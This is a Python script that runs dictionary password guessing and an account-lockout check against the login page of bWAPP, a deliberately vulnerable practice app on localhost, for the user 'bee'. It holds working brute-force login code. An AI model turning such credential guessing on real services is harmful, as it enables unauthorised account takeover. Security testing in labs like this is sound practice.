import requests
import concurrent.futures
import time

def load_passwords(file_path):
    """
    Loads passwords from a specified file.
    
    Args:
        file_path (str): The path to the file containing passwords.
    
    Returns:
        list: A list of passwords.
    """
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

def check_common_passwords(url, username, passwords):
    """
    Checks for common weak passwords by attempting to log in with each password.
    
    Args:
        url (str): The URL to send the login request to.
        username (str): The username to use for login attempts.
        passwords (list): A list of passwords to check.
    
    Returns:
        list: A list of results indicating if a weak password was found.
    """
    results = []
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            results.append(f"Weak password found: {password}")
            break
    return results

def brute_force_attack(url, username, password_list):
    """
    Simulates a brute force attack by attempting to log in with each password.
    
    Args:
        url (str): The URL to send the login request to.
        username (str): The username to use for login attempts.
        password_list (list): A list of passwords to attempt.
    
    Returns:
        list: A list of results indicating if a password was found.
    """
    results = []
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            results.append(f"Password found: {password}")
            break
    return results

def check_account_lockout(url, username):
    """
    Checks for an account lockout mechanism by sending multiple incorrect login attempts.
    
    Args:
        url (str): The URL to send the login request to.
        username (str): The username to use for login attempts.
    
    Returns:
        list: A list of results indicating if an account lockout mechanism was detected.
    """
    results = []
    for i in range(10):
        response = requests.post(url, data={'username': username, 'password': 'wrongpassword'})
        if response.status_code == 429:  # Too Many Requests
            results.append("Account lockout mechanism detected.")
            break
    if not results:
        results.append("No account lockout mechanism detected.")
    return results

def execute_with_timeout(func, *args, timeout=15):
    """
    Executes a function with a specified timeout.
    
    Args:
        func (function): The function to execute.
        timeout (int, optional): The maximum time to allow for the function execution.
    
    Returns:
        list: The result of the function execution, or a timeout message if the execution exceeds the timeout.
    """
    with concurrent.futures.ThreadPoolExecutor() as executor:
        future = executor.submit(func, *args)
        try:
            return future.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            return ["Function execution exceeded timeout."]

def main():
    """
    Main function to execute the password check, brute force attack simulation, and account lockout check.
    """
    target_url = "http://localhost/bWAPP/ba_weak_pwd.php"
    username = 'bee'
    password_file = 'common-password.txt'
    
    # Load passwords from file
    passwords = load_passwords(password_file)
    
    # Check for common weak passwords with timeout
    common_password_results = execute_with_timeout(check_common_passwords, target_url, username, passwords)
    
    # Simulate brute force attack with timeout
    brute_force_results = execute_with_timeout(brute_force_attack, target_url, username, passwords)
    
    # Check for account lockout mechanism with timeout
    account_lockout_results = execute_with_timeout(check_account_lockout, target_url, username)
    
    # Print all results separately
    print("Common Password Check Results:")
    for result in common_password_results:
        print(result)
    
    print("\nBrute Force Attack Results:")
    for result in brute_force_results:
        print(result)
    
    print("\nAccount Lockout Check Results:")
    for result in account_lockout_results:
        print(result)
        
if __name__ == "__main__":
    main()
